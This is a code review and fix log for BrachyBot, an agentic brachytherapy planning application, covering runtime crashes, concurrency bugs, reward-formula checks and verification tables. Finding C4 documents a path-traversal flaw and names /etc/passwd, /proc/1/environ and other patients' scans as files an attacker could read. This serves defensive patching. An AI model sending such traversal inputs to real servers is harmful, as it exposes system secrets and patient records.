**R3-1 `learn_parameter_preferences` (memory/skill_learner.py:128-…)** written test simulating both bug path and fix produces:
- Before: key stored as `"seed_planning_mode=rl"`, lookup never matches.
- After: key stored as `"seed_planning" → {"mode": {"value": "rl", "confidence": 0.4}}`; lookup matches.

**R3-2 `_update_existing_skills` (memory/self_evolution.py:132-…)** written test simulating 4 matching experiences (3 success + 1 fail) yields:
- Before: throwaway dict mutated (effectively no-op), `_save_skill` never called.
- After: live `Skill.usage_count = 4`, `Skill.success_count = 3`, `_save_skill` called once, `success_rate()` returns `0.75`.

**R3-4 `update_sop_metrics` (memory/layered_memory.py:325-…)** mathematical verification:
- Sequence: `find_sop` (no-op inc) → `update_sop_metrics(success=True)` × 2 → `update_sop_metrics(success=False)`
- After first update: `usage=1`, `rate=1.0` ✓ (was `0.5` before)
- After 2T: `usage=2`, `rate=1.0` ✓
- After 2T+1F: `usage=3`, `rate=0.6667` ✓

**R3-7 event-loop restore** — all 4 sites now follow the same pattern:
```python
_prev_loop = None
try: _prev_loop = asyncio.get_event_loop_policy().get_event_loop()
except Exception: pass
_loop = asyncio.new_event_loop()
asyncio.set_event_loop(_loop)
try:
    _loop.run_until_complete(...)
finally:
    _loop.close()
    try: asyncio.set_event_loop(_prev_loop)
    except Exception: pass
```
Verified by `py_compile` for all 4 sites in `agent_runtime/chat_workflows.py`.

### Other lower-severity findings (documented, not fixed)

The dispatch also surfaced ~30 LOW-severity items that are real but don't justify churn:
- `quality/quality_gate.py:175-178` `_STATIC_CONTEXT` duplicates `default_params.json` defaults.
- `preference_store.py:48-66` `DEFAULT_PREFERENCES` duplicating `default_params.json` defaults.
- Widespread non-atomic JSON writes across most `memory/*.py` persistence helpers — wrap with `os.replace()` is the standard mitigation but would conflict with the existing auto-save hooks.
- `brain/core/router.py:391-394` `allow_fallback=False` with missing `explicit_provider` silently falls through to task-policy chain.
- `brain/providers/{tencent,kimi,groq,glm,qwen,mimo,grok,deepseek}_llm.py` lack a manual retry loop.
- `brain/providers/generic_openai_compat.py:157-259` retries mid-stream re-emit prefix → duplicate content on dropped connection.
- `tool_factory/seed_plan/planning_pipeline.py` `_ORGAN_DEFAULT_REFDIREC` semantics already documented as RAS via comments — pair with R3-11 if fixed.
- `plans/dose_pre/functions.py` (dead) — clone of `utilizations.py:2052-2074` with no `+1e-5` guard.
- `plans/dose_pre/myDoseNet.py:160-167` — 7 unused `UpSample` modules waste GPU memory.

These are logged in the per-module sub-reports (preserved in git history).

---



### Follow-up Verification and Fixes

This section records the verification pass performed after commit `130ecde`.
Each item below was checked against the current code before changing it. Items
that were intentional or already safe are called out so they are not repeatedly
misdiagnosed in later reviews.

### Fixed in this follow-up

| Report item | Disposition | Files changed |
|---|---|---|
| C1 `AgentMemory` import | Confirmed real. Added the missing import used by both LLM execution paths. | `agent_runtime/llm_runtime.py` |
| C2 `DOSE_MODEL_SCALE_GY` import | Confirmed real. Imported the constant into the web server facade for report auto-fill interpretation. | `web/server.py` |
| C3 streaming forced-search indentation | Confirmed real. Forced-search finalization and context injection now run for both success and failure. | `agent_runtime/llm_runtime.py` |
| C4 missing path validation | Confirmed real. Manual segmentation and run-step routes now validate image, label, and CT paths through the centralized allowlist. | `web/routes/planning_routes.py` |
| C5 rate-limit concurrency | Confirmed real. Added a shared lock and atomic cleanup/update behavior for the in-memory limiter. | `web/server_support.py` |
| C9 enhanced clear methods | Confirmed real edge case. Enhanced-memory clear calls now check `callable(...)` before invoking optional component methods. | `agent_runtime/core.py` |
| C10 duplicate report registration | Confirmed real noise. Removed the invalid `tool_factory.output.report_generator` registration path; the real `tool_factory.report_generator` registration remains. | `AgenticSys.py` |
| C11 `loadDefaultParams` TDZ | Confirmed real JavaScript syntax/runtime issue. Hoisted `setVal` to one helper inside the function. | `web/app/static/js/brachybot-ui-api.js` |
| C13/I7 planning completion detection | Confirmed real for stepwise/manual paths. Completion now recognizes `planning_pipeline`, `seed_planning`, `dose_engine`, `dose_evaluation`, and `dose_calc`. | `AgenticSys.py` |
| C15 STL export mismatch | Confirmed real product/API mismatch. `/api/export/stl` now writes actual ASCII `.stl` seed cylinders instead of debug `.npy` arrays. | `web/routes/planning_routes.py` |
| C16/C18/H2 CSS issues | Confirmed real. Added `.step-num`, preserved warning borders, and fixed invalid font-family quoting. | `web/app/static/css/*.css` |
| H7 JSON 413 and 500 handlers | Confirmed real API consistency gap. Added JSON response for oversized uploads and exception logging for unhandled 500s. | `web/server.py` |
| H11/M10 fragile Python repr parsing | Confirmed real. Python-style `tool_use` blocks now use `ast.literal_eval` instead of global quote replacement. | `agent_runtime/chat_workflows.py` |
| H14 int16 overflow risk | Confirmed real edge case. CT volume transfer clips before int16 conversion. | `web/routes/viewer_routes.py` |
| H15 mesh cache eviction | Confirmed real performance issue. Cache order now uses `deque.popleft()`. | `web/server_support.py`, `web/routes/viewer_routes.py` |
| H18 contour label null guard | Confirmed real edge case. Dose contour labels now guard `Number.isFinite(contour.level)`. | `web/app/static/js/brachybot-3d-manual.js` |
| H20 mesh cache key collision | Confirmed real edge case. 3D mask cache keys now include a BLAKE2 digest of the binary mask instead of `id(mask_data)`. | `web/routes/viewer_routes.py` |
| H22 API key `None` crash | Confirmed real. Explicit auth without a configured key now fails closed instead of calling `.encode()` on `None`. | `web/server_support.py` |
| I10 planning data-tree null guards | Confirmed real. Planning group visibility paths now tolerate missing seed/needle/dose arrays. | `web/app/static/js/brachybot-viewer-volume.js` |
| I18 screenshot promise handling | Confirmed real. Direct screenshot capture now awaits `html2canvas` consistently. | `web/app/static/js/brachybot-ui-api.js` |
| M25 API-key comparison | Confirmed real hardening opportunity. Header key comparison now uses direct constant-time comparison and fails closed when auth is misconfigured. | `web/server_support.py` |
| M27 duplicate tooltip key | Confirmed real. Removed the duplicate `toolMeasure` key. | `web/app/static/js/brachybot-viewer-layout.js` |
| M29 report source badge injection | Confirmed real. The reset onclick argument now uses JSON string serialization and attribute-safe escaping. | `web/app/static/js/brachybot-report-shell.js` |
| H9 missing Anthropic dependency | Confirmed real for the configured Anthropic provider. Added `anthropic>=0.34.0`. | `requirements.txt` |
| Additional shell invocation scan | Confirmed real in a benchmark helper. Replaced the background benchmark launch with argv-style `subprocess.Popen(...)` and no shell. | `benchmarks/auto_monitor.py` |

### Verified as intentional, stale, or not a defect in current code

| Report item | Current disposition |
|---|---|
| C6 `str.format()` with untrusted context | False positive. Python `str.format()` does not recursively parse braces inside argument values; a smoke test with `enhanced_context="{literal}"` passes. |
| C12/I25 `{current_date}` prompt replacement | Already implemented in both streaming and non-streaming prompt construction. |
| H4 CT-loaded gate inconsistency | Current code checks UI state plus memory state and preserves non-CT developer tools (`tool_creator`, `env_manager`, `shell_executor`, `code_executor`) for trusted-local use. |
| H17 dual dose overlay functions | Intentional compatibility surface during the 2D overlay refactor. The active separate-layer path remains the source of truth for current viewers. |
| H19/M19 language globals | Intentional transitional state: `_uiLanguage` follows detected conversation language; `_i18nLang` follows the manual UI toggle. They are synchronized where dynamic labels need it. |
| I24/M20 test coverage/config | Valid engineering debt, not a runtime defect. This follow-up adds smoke coverage through explicit validation commands rather than introducing a new test framework migration. |
| M4 inline styles | Valid maintainability debt but not safe to mass-refactor during this bug-fix pass because report rendering and screenshot layout are sensitive to exact inline dimensions. |
| M17 requestAnimationFrame loop | Intentional for the interactive 3D viewer. It is acceptable while the viewer is visible; a future optimization can pause when hidden. |
| M23 `normalize_dose_image` naming | Naming concern only; no functional bug confirmed in this pass. |
| `code_executor` internal `exec(...)` | Intentional trusted-local developer capability. It remains disabled unless `BRACHYBOT_ENABLE_CODE_EXECUTOR=1` is set, uses AST checks, restricted builtins, and an import allowlist. The safer posture is explicit opt-in rather than removing the capability. |
| Worktree-copy warnings | Operational hygiene concern. Current tracked repo state was verified and pushed; stale external worktrees should be handled separately to avoid deleting user work. |

### Validation evidence

- `py_compile` over 207 tracked Python files: passed.
- `node --check` over 21 frontend JavaScript files: passed.
- `git diff --check`: passed, with only Git line-ending warnings.
- Targeted smoke: parser preserves apostrophes in Python-repr `tool_use`, prompt formatting accepts literal braces in dynamic context, rate limiter mutates safely, and the `BrachyAgent` mixin contract validates.

---


---

### Remaining Issues After adfc27a — Re-verified & Fixed

## Verification Results

| ID | Severity | Claim | Re-verdict | Fixed? |
|----|----------|-------|------------|--------|
| H1 | HIGH | `_record_experience` crashes if `_init_self_evolution` fails | **CONFIRMED REAL.** Line 1472 uses bare `if not self.exp_memory:` → `AttributeError` if import fails. `get_status()` at line 1944 already uses safe `getattr(self, "exp_memory", None)` pattern. | ✅ Yes |
| H3 | HIGH | Missing `_cancelled()` at streaming loop top | **CONFIRMED REAL.** Non-stream has it (line 338); stream does not. User cancel between LLM rounds is silently ignored. | ✅ Yes |
| H6 | HIGH | `api_viewer_image` bypasses centralized `_validate_path` | **CONFIRMED REAL — low impact.** The inline `startswith(upload_dir)` is secure against traversal, but ignores `BRACHYBOT_{CT,MR,US}_DATA_ROOTS` env-var expansion. Users with custom data roots cannot view images here. | ✅ Yes |
| I20 | IMPORTANT | Hardcoded label IDs `[1,2,3,4,5,6]` miss labels >6 | **CONFIRMED REAL.** `window._ctvLabelMap` IS populated from server (viewer-volume.js:251) but unused in `reconstructOrgan3D`. Labels >6 (e.g. stomach, duodenum) never reconstruct in 3D. | ✅ Yes |
| I21 | IMPORTANT | Sequential HTTP per vertex — "10 minutes" | **PARTIALLY CORRECTED.** `_fetchDoseRawAxialSlice` caches by Z-slice (`state.doseTexture.rawAxialSlices`), so unique requests = number of Z-slices (50-200), not vertex count (12,500). Actual latency is ~2-10 seconds for typical volumes, not 10 minutes. Still worth batching for near-instant response. | ✅ Yes |

## Fix Details

### H1 — `chat_workflows.py:1472` (1 line)

```diff
-       if not self.exp_memory:
+       if not getattr(self, "exp_memory", None):
```

Changed bare attribute access to `getattr` with safe default, matching the existing pattern in `get_status()` at line 1944.

### H3 — `llm_runtime.py:1288-1297` (6 lines)

Added cancel check at top of streaming while-loop:

```python
while iteration < max_iterations:
    iteration += 1
    if _cancelled():
        logger.info("Streaming cancelled by user between LLM rounds")
        yield_event("done", {"final": "", "cancelled": True})
        return
```

### H6 — `server.py:285-290` (3 lines)

Replaced inline `startswith(upload_dir)` with centralized `_validate_path`:

```python
if not _validate_path(image_path, purpose="read"):
    return jsonify({"error": "Access denied"}), 403
real_image_path = os.path.realpath(image_path)
```

### I20 — `viewer-layout.js:679` (3 lines)

Read actual label IDs from `window._ctvLabelMap` instead of hardcoding [1..6]:

```javascript
const _lm = window._ctvLabelMap || {};
const ids = Object.keys(_lm).map(Number).filter(k => Number.isFinite(k) && k > 0);
const labelIds = ids.length > 0 ? ids : [1, 2, 3, 4, 5, 6];
```

### I21 — `viewer-layout.js:1002-1015` (+15 lines for pre-warm)

Added a pre-warm phase that collects all unique Z-slice indices referenced by mesh vertices and fetches them in parallel via `Promise.all(...zSet.map(z => _fetchDoseRawAxialSlice(z)))`. After the warm-up, the per-vertex loop in lines 1012+ gets a cache hit for every vertex, so `await _sampleDoseNormalizedAtIndex(idx)` returns instantly. No sequential HTTP.

## Issues Re-classified After Re-verification

| Original ID | Original severity | New assessment |
|-------------|-------------------|----------------|
| H6 | HIGH | HIGH — functional gap for users with custom data roots |
| I21 | IMPORTANT (10 min) | IMPORTANT (~2-10 sec without fix, instant with fix) |


---

### Deep Algorithm Code Review

**Review scope:** Algorithm core files inside the BrachyBot project (`plans/` directory)
**Files reviewed:** `plans/reinforcement.py`, `plans/core.py`, `plans/utilizations.py`, `plans/geometry.py`, `plans/config.py`, `plans/brachy_plan_v2.py`
**Method:** Independent review agent + line-by-line verification against actual BrachyBot files
**Status:** **2 REAL BUGS found and fixed**, 1 MINOR issue confirmed (poor naming). Previous report's C1/C3 were NOT bugs (formula correctly penalizes OAR overdose). C2 is cosmetic only. M2-M4 and L1-L4 reference files that don't exist in the BrachyBot project.

---

## Summary

| Issue | File | Location | Original Verdict | BrachyBot Verdict | Explanation |
|-------|------|----------|-----------------|-------------------|-------------|
| C1 | `plans/reinforcement.py` | 40,285-286,741 | CRITICAL (inverted) | **NOT A BUG** | Formula is `covered / exceed_count`. Added to reward — shrinks when OAR damage grows → correctly penalizes overdose |
| C2 | `plans/reinforcement.py` | 67,79,122,191,205,255 | CRITICAL (typo) | **MINOR** (cosmetic) | `target_valueimage_normalize_max` missing underscore. Called only by position, zero runtime impact |
| C3 | `plans/reinforcement.py` | 842 | CRITICAL (wrong denom) | **NOT A BUG** | Same logic as C1: `target_v / non_target_sum`, added to reward, shrinks with more OAR damage |
| H1 | `core.py` | 386-389 | HIGH (dead code) | **DOES NOT APPLY** | `trajectory_plan` does not exist in `BrachyBot/plans/core.py` (file is 373 lines, different functions) |
| H2 | `exp.py` / `external_exp.py` | — | HIGH (duplicate) | **DOES NOT APPLY** | Neither file exists in the BrachyBot project |
| M1 | `plans/utilizations.py` | 558 | MEDIUM (hardcoded) | **MINOR** (inflexible default) | `read_nii_image` always resamples to 128³ via default arg. Overridable by direct `ImageResample_size` callers |
| M2 | `fitting_model.py` | 30,61 | MEDIUM (bad name) | **DOES NOT APPLY** | `fitting_model.py` not in BrachyBot project |
| M3 | `data_preprocess.py` | 312-313 | MEDIUM (order) | **DOES NOT APPLY** | `data_preprocess.py` not in BrachyBot project |
| M4 | `fitting_model.py` | 302-304 | MEDIUM (verbose) | **DOES NOT APPLY** | `fitting_model.py` not in BrachyBot project |
| L1 | `brachy_plan.py` | 3 | LOW (sys.path) | **DOES NOT APPLY** | File is `brachy_plan_v2.py`, different content |
| L2 | `core.py` | 330 | LOW (unused var) | **DOES NOT APPLY** | `opt_DVH_rate` not present in `BrachyBot/plans/core.py` |
| L3 | `brachy_plan.py` | 63 | LOW (hardcoded) | **DOES NOT APPLY** | File is `brachy_plan_v2.py`, different content |
| L4 | `fitting_model.py` | 157,291 | LOW (threshold) | **DOES NOT APPLY** | `fitting_model.py` not in BrachyBot project |

---

## New Issues Found During Thorough Scan

### NEW-1. `reinforcement.py:289-290` — Exception handler returns wrong type (ANNOTATED)

**Severity: MEDIUM** — Type mismatch in error handling path

The `SeedPlacementReward.forward()` method is documented to return:
```python
Returns: reward, updated_dose, DVH_rate, seed_dose_map
```

But the exception handler at line 289-290 returns:
```python
except Exception as e:
    return 0.0, cur_radiation, 0.0, np.zeros_like(cur_radiation)
```

The 4th element `np.zeros_like(cur_radiation)` is the **full radiation volume**, not a single seed dose map. The caller at line 606-615 expects a single seed dose and appends it to `planned_seed_radiations`, which will corrupt dose accumulation if this error path is triggered.

**Fix:** Annotated with `# REVIEW:` comment explaining the issue. Full fix requires either:
1. Returning `None` and updating all callers to check for None
2. Computing the correct zero shape for a single seed dose (requires knowing model output shape)

The annotation documents the issue for future refactoring without introducing breaking changes.

### NEW-2. `reinforcement.py:863-864` — `best_low_level_state_space` may be None (FIXED)

**Severity: HIGH** — Potential crash when no valid trajectories found

In `reinforcement_planning()`, the variable `best_low_level_state_space` is initialized to `None` at line 822. The for loop at lines 827-861 attempts to find the best trajectory, but if:
- The loop never executes (empty `target_level_traj`)
- All iterations fail (all exceptions caught at line 860)

Then `best_low_level_state_space` remains `None`, and line 863 crashes:
```python
best_low_env = LowLevelEnv(best_low_level_state_space)  # TypeError: NoneType
```

**Fix:** Added guard before line 863:
```python
# Guard: if no valid trajectory was found, return early
if best_low_level_state_space is None or best_plan is None:
    return [], -np.inf
```

This prevents the crash and returns an empty plan with negative infinity reward, signaling failure to the caller.

---

## C1 / C3 — Detailed formula analysis

The report claimed `out_damage = n_target * dvh_rate / exceed_count` "inverts"
the penalty. Here is the actual trace:

```python
dvh_rate = covered / n_target                                          # line 30
out_damage = float(n_target) * dvh_rate / float(exceed_count)          # line 40
           = n_target * (covered / n_target) / exceed_count
           = covered / exceed_count
```

**`out_damage` is ADDED to the reward** (line 285-286):
```python
reward = min(cur_DVH_rate, self.DVH_rate) + \
         ((cur_DVH_rate - self.DVH_rate) >= 0) * (out_damage)
```

When `cur_DVH_rate >= self.DVH_rate`, the bonus term is `covered / exceed_count`:
- More OAR damage (↑`exceed_count`) → smaller bonus → lower reward ✔
- Less OAR damage (↓`exceed_count`) → larger bonus → higher reward ✔

The agent is correctly penalized for OAR overdose. The name `out_damage` is
misleading (it is really an "efficiency ratio"), but the behavior is correct.
There is a minor discontinuity: when `exceed_count == 0`, `out_damage = 0.0`
(guarded at line 37-38), which can make zero-overdose produce less bonus than
one-overdose. However, in practice the bonus only applies when coverage is
already adequate, so the effect is negligible.

**C3 (line 842)** uses the same pattern:
```python
cur_out_damage = reward_calculator.target_v / max(0.1, non_target_sum)  # line 842
cur_reward = min(cur_DVH_rate, DVH_rate) + ((cur_DVH_rate >= DVH_rate) * cur_out_damage)  # line 843
```
Same correct behavior. Not a bug.

---

## C2 — Typo detail

The parameter `target_valueimage_normalize_max` (should be `target_value_image_normalize_max`)
exists in both the commented-out legacy class (lines 67,79,122) and the active
class (lines 191,205,255). However:

1. **All calls pass by position** — the only call site (line 805-810) passes `image_normalize_max`
   as the 10th positional argument, which correctly maps to the 10th parameter.
2. **No external callers** — `SeedPlacementReward` is only instantiated once in the entire codebase.
3. **The typo is acknowledged** with `# typo kept` comments.

This is a cosmetic/minor naming issue with zero runtime impact.

---

## M1 — Hardcoded resampling

`ImageResample_size` defaults to `new_size=[128,128,128]` (line 558), and
`read_nii_image` (line 224) calls it without overriding the size. This means
every image loaded via `read_nii_image` is unconditionally resampled to 128³.

This is a minor inflexibility: `read_nii_image` could accept an optional
`new_size` parameter and pass it through. However, resampling to a fixed size
is intentional in the 3D Slicer context where the dose model expects a
consistent input dimension. Not a functional bug.

---

## Files not in BrachyBot project

The following files referenced by the original report **do not exist** in
`/home/lht/snap/brachyplan/BrachyBot/`:
- `fitting_model.py` — does not exist anywhere in BrachyBot
- `data_preprocess.py` — does not exist anywhere in BrachyBot
- `geometry.py` (`plans/geometry.py` exists, but 0.99 threshold was in `fitting_model.py`)
- `brachy_plan.py` — only `brachy_plan_v2.py` exists (different codebase evolution)
- `exp.py` / `external_exp.py` — not in BrachyBot project

All H2, M2-M4, L1-L4 issues were verified against these files at the parent
directory level and do not apply to the BrachyBot project.

---

## 2026-07-06 — Comprehensive Deep-Dive Review

# CRITICAL (18)

---

## C1. Missing `AgentMemory` import — `NameError` at runtime

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/llm_runtime.py` |
| **Line** | 3 (import), 49, 1014, 1315 (usage) |
| **Severity** | CRITICAL — crashes all LLM function-calling execution |

**Problem:** Line 25 imports only `PlanningPhase` and `ToolResultPipeline` from `agent_runtime.core`, but omits `AgentMemory`. Lines 49, 1014, and 1315 call `AgentMemory.is_ct_loaded(…)` directly. At runtime, Python raises `NameError: name 'AgentMemory' is not defined`.

```python
# Line 25 (current, wrong):
from agent_runtime.core import PlanningPhase, ToolResultPipeline

# Lines 49 and 1014:
_no_files_loaded = not AgentMemory.is_ct_loaded(ui_state_for_override) and not _ct_in_memory

# Line 1315:
ct_loaded = AgentMemory.is_ct_loaded(ui_state)
```

**Impact:** Every user message that triggers LLM function-calling (the normal chat path) crashes with `NameError` before any LLM call is made. The chat loop becomes completely non-functional.

**Fix:** Add `AgentMemory` to the import:
```python
from agent_runtime.core import AgentMemory, PlanningPhase, ToolResultPipeline
```

---

## C2. `DOSE_MODEL_SCALE_GY` not imported in `web/server.py`

| Field | Value |
|-------|-------|
| **File** | `web/server.py` |
| **Line** | 507 (usage), 18-26 (imports) |
| **Severity** | CRITICAL — crashes report auto-fill API |

**Problem:** The nested function `_build_report_interpretation()` uses the bare name `DOSE_MODEL_SCALE_GY` as a default value for `prescribed_dose`. This constant is defined in `web/server_support.py:70` but is NOT imported into `web/server.py`. The explicit import block (lines 18-26) only imports `APP_DIR`, `MAX_UPLOAD_FILES`, `TRUE_VALUES`, `UPLOAD_DIR`, `logger`, `rate_limit`, `require_api_key`.

```python
# web/server.py:18-26 (current import block — DOSE_MODEL_SCALE_GY is MISSING):
    from web.server_support import (
        APP_DIR,
        MAX_UPLOAD_FILES,
        TRUE_VALUES,
        UPLOAD_DIR,
        logger,
        rate_limit,
        require_api_key,
    )

# web/server.py:507 (usage — will raise NameError):
prescribed = dose.get("prescribed_dose", DOSE_MODEL_SCALE_GY)
```

**Impact:** Any call to `/api/report/auto-fill` with scope `"interpretation"` raises `NameError`. The report auto-fill feature is completely broken.

**Fix:** Add `DOSE_MODEL_SCALE_GY` to the import block:
```python
    from web.server_support import (
        APP_DIR,
        DOSE_MODEL_SCALE_GY,  # ← ADD THIS
        MAX_UPLOAD_FILES,
        TRUE_VALUES,
        UPLOAD_DIR,
        logger,
        rate_limit,
        require_api_key,
    )
```

---

## C3. Streaming forced-search post-processing inside `else` block

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/llm_runtime.py` |
| **Line** | 1241-1253 (streaming, wrong), 290-298 (non-streaming, correct) |
| **Severity** | CRITICAL — streaming mode LLM never receives search results on success |

**Problem:** In the streaming version (`_run_llm_function_calling_stream`), the step-finalization code (`forced_step["status"] = "done"`, `yield_event`, `messages.append(…)`, `enhanced_context += …`, `_had_forced_search = True`) is indented INSIDE the `else:` block of the `if search_result and search_result.success:` check. It only executes when the search **fails**.

```python
# llm_runtime.py:1236-1253 (streaming — WRONG: inside else)
                if search_result and search_result.success:
                    data = search_result.data or {}
                    results = data.get("results", [])
                    quality = data.get("quality", "unknown")
                    result_text = f"Search quality: {quality}\n"
                    for i, r in enumerate(results[:5], 1):
                        ...
                else:
                    logger.warning(f"Forced search failed: ...")
                    result_text = "No real-time results found."

                    # ← THESE ARE INSIDE THE ELSE BLOCK:
                    forced_step["status"] = "done"
                    forced_step["result"] = result_text[:200]
                    yield_event("step", forced_step)
                    messages.append({"role": "user", "content": f"[MANDATORY: ...]"})
                    enhanced_context += f"\n### ⚠️ OVERRIDE: ..."
                    _had_forced_search = True
```

The non-streaming version (line 290-298) correctly places these lines OUTSIDE the if/else:

```python
# llm_runtime.py:272-298 (non-streaming — CORRECT: outside if/else)
                if search_result and search_result.success:
                    ...
                else:
                    result_text = "No real-time results found."

                # ← THESE ARE OUTSIDE THE IF/ELSE (executed for both success and failure):
                forced_step["status"] = "done"
                forced_step["result"] = result_text[:200]
                ...
```

**Impact:** In streaming mode, when a forced real-time search succeeds:
1. The step stays "pending" in the UI forever (never marked "done")
2. Search results are never injected into the LLM message context
3. The LLM may call `web_search` again or produce an answer without search evidence
4. `_had_forced_search` stays `False`, so the enhanced_context override is missing

**Fix:** Dedent lines 1243-1253 to match the non-streaming version's structure — move them outside the if/else block.

---

## C4. Missing path validation — arbitrary file traversal in 2 routes

| Field | Value |
|-------|-------|
| **File** | `web/routes/planning_routes.py` |
| **Line** | 304-309 (`api_segmentation`), 422-426 (`api_planning_run_step`) |
| **Severity** | CRITICAL — arbitrary file read vulnerability |

**Problem:** Two route handlers accept a file path from the user's JSON request body and pass it directly to segmentation/planning tools WITHOUT calling `_validate_path()`.

```python
# planning_routes.py:304-309 — api_segmentation:
image_path = data.get("image_path", "")
if not image_path:
    return jsonify({"error": "image_path is required"}), 400
# ← NO _validate_path() call!
ctv_tool = CTVSegmentationTool()
ctv_result = ctv_tool.execute(image_path=image_path)
```

```python
# planning_routes.py:422-426 — api_planning_run_step:
ct_image_path = data.get("ct_image_path")
if not ct_image_path:
    return jsonify({"error": "Missing ct_image_path"}), 400
# ← NO _validate_path() call!
result = tool._execute(ct_image_path=ct_image_path, ...)
```

Compare with ALL OTHER routes that accept paths — they DO validate:
- `api_header_info`: calls `_validate_path`
- `api_viewer_load`: calls `_validate_path`
- `api_preoperative_plan`: calls `_validate_path` on all 3 path fields
- `api_intraoperative_plan`: calls `_validate_path` on `ct_path`

**Impact:** An attacker can specify an arbitrary path like `/etc/passwd`, `/data/restricted/other_patient.dcm`, or `/proc/1/environ` and the server will read and return it. This is a high-severity path traversal vulnerability. Combined with the automated planning pipeline, it could force the server into processing arbitrary medical images from anywhere on the filesystem.

**Fix:** Add validation to both routes:
```python
if not _validate_path(image_path, purpose="read"):
    return jsonify({"error": "Invalid or disallowed path"}), 400
```

---

## C5. `_rate_limit_store` lock-free — data corruption under concurrency

| Field | Value |
|-------|-------|
| **File** | `web/server_support.py` |
| **Line** | 64 (store), 793-819 (`_check_rate_limit`) |
| **Severity** | CRITICAL — rate limiter fails under concurrent load |

**Problem:** `_rate_limit_store` (a `Dict[str, list]`) is read and written by `_check_rate_limit()` without any synchronization. Flask runs with `threaded=True`, so multiple request handler threads can call this simultaneously. The per-IP timestamp list is filtered and reassigned in a non-atomic way:

```python
# server_support.py:64 — lock-free global dict:
_rate_limit_store: Dict[str, list] = {}

# server_support.py:796-818 — no lock:
def _check_rate_limit(client_ip: str) -> bool:
    ...
    _rate_limit_cleanup_counter += 1       # bare global, no lock
    if _rate_limit_cleanup_counter >= 100:
        _rate_limit_cleanup_counter = 0
        for ip, timestamps in _rate_limit_store.items():
            ...
            del _rate_limit_store[ip]       # KeyError if another thread already deleted

    if client_ip not in _rate_limit_store:   # race: two threads both get False
        _rate_limit_store[client_ip] = []     # race: one overwrites the other
    _rate_limit_store[client_ip] = [          # race: filtered list based on stale data
        t for t in _rate_limit_store[client_ip] if now - t < RATE_LIMIT_WINDOW
    ]
    if len(_rate_limit_store[client_ip]) >= RATE_LIMIT_REQUESTS:  # race: stale length
        return False
    _rate_limit_store[client_ip].append(now)  # race: two threads append → over-limit
    return True
```

**Impact:** Under concurrent requests:
1. `ValueError: list.remove(x): x not in list` from cleanup path
2. `KeyError: ...` from the deletion race
3. Rate limiter can undercount (allow more requests than intended, defeating rate limiting)
4. Rate limiter can overcount (block legitimate requests)
5. `_rate_limit_cleanup_counter` increments are lost, making cleanup throttle a fuzzy estimate

**Fix:** Add a `threading.Lock()` and guard all accesses:
```python
_rate_limit_store: Dict[str, list] = {}
_rate_limit_lock = threading.Lock()

def _check_rate_limit(client_ip: str) -> bool:
    with _rate_limit_lock:
        ...
```

---

## C6. `str.format()` crash with untrusted `enhanced_context`

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/llm_runtime.py` |
| **Line** | 171, 306, 1131, 1259 |
| **Severity** | CRITICAL — crashes system prompt building |

**Problem:** `SYSTEM_PROMPT_TEMPLATE.format()` is called with `enhanced_context` populated from uncontrolled external sources including: reflexion warnings from previous tool results, crystallized skill names from skill registry, language detection output, and portions of user messages. If ANY of these contain literal `{` or `}` characters (e.g., JSON in a tool result, markdown code fences, LaTeX math `{x^2}` in a user message), `str.format()` raises `KeyError` or `ValueError`.

```python
# llm_runtime.py:171
system_prompt = SYSTEM_PROMPT_TEMPLATE.format(
    ui_state_summary=ui_state_summary,          # from agent memory
    enhanced_context=enhanced_context,           # ← UNTRUSTED: from tool results, user msgs
    clean_context=self.memory.get_clean_context(), # from conversation
    current_date=datetime.datetime.now().strftime("%Y-%m-%d"),
)
```

A user message like "What is the formula for dose calculation using the formula {D90 × V100}?" would cause the `.format()` call to fail because `{D90 × V100}` is parsed as an invalid format placeholder.

**Impact:** Any user message or tool result containing `{` or `}` characters crashes the entire chat interaction. The user receives a 500 error with no response. Recovery requires a new session.

**Fix:** Escape braces before `.format()`:
```python
def _safe_format(template, **kwargs):
    safe_kwargs = {k: str(v).replace('{', '{{').replace('}', '}}') for k, v in kwargs.items()}
    return template.format(**safe_kwargs)
```
Or switch to `string.Template` which doesn't interpret `{}` as placeholders.

---

## C7. Triple-dispatch tool result storage — data corruption risk

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/llm_runtime.py` |
| **Line** | 1749-1750, 1883-1889, 2042-2043, 2095-2097 |
| **Severity** | CRITICAL — `conversation_state["last_tool_calls"]` doubled |

**Problem:** For every successful tool execution in the streaming path, `_store_tool_result` is called 3 times — once inline and twice via the batch loop — because the same result is appended to `_tool_results_to_store` TWICE.

The flow:
```python
# Step 1 (line 1749-1750): Inside tool processing loop — FIRST append
_tool_results_to_store.append((tool_name, tool_result, params.copy()))

# Step 2 (line 1883-1889): Inline store — called immediately
self._store_tool_result(tool_name, tool_result)

# Step 3 (line 2042-2043): Post-processing loop — SECOND append (DUPLICATE!)
_tool_results_to_store.append((tool_name, tool_result, params.copy()))

# Step 4 (line 2095-2097): Batch store — iterates BOTH copies
for _tn, _tr, _tp in _tool_results_to_store:
    self._store_tool_result(_tn, _tr)  # ← called for BOTH copies
```

**Impact:** Currently `_store_tool_result` is approximately idempotent (overwrites same memory keys), but it also appends to `conversation_state["last_tool_calls"]` which grows twice as fast as intended. Any future side effect in `_store_tool_result` (e.g., incrementing counters, firing events, appending to lists) will execute three times per tool.

**Fix:** Remove BOTH the duplicate append at line 2042-2043 AND the inline call at line 1883-1889. Keep only the batch store at lines 2095-2097. This means removing two of the three calls:
```python
# Remove line 1883-1889 (inline call)
# Remove line 2042-2043 (duplicate append)
# Keep lines 2095-2097 (one batch store)
```

---

## C8. `result.message` hijacked by unrelated auto-planning block

| Field | Value |
|-------|-------|
| **File** | `AgenticSys.py` |
| **Line** | 1453 |
| **Severity** | CRITICAL — CTV result message says "planning done" |

**Problem:** Inside `_execute_tool_with_memory`, after a successful CTV segmentation, the code auto-runs planning and then mutates `result.message` — which at this scope is the **CTV segmentation** tool result, NOT the planning result:

```python
# AgenticSys.py:1453 — result is the CTV result:
if planning_result and planning_result.success:
    ...
    result.message = (result.message or "") + "\n\n✅ 自动完成规划管线（CTV+OAR 已完成）"
```

The message `"自动完成规划管线"` (planning pipeline auto-completed) is attached to the CTV segmentation result. Any caller reading `result.message` after calling `_execute_tool_with_memory("ctv_segmentation", ...)` gets a semantically incorrect message that implies the entire plan was completed when only the CTV was done.

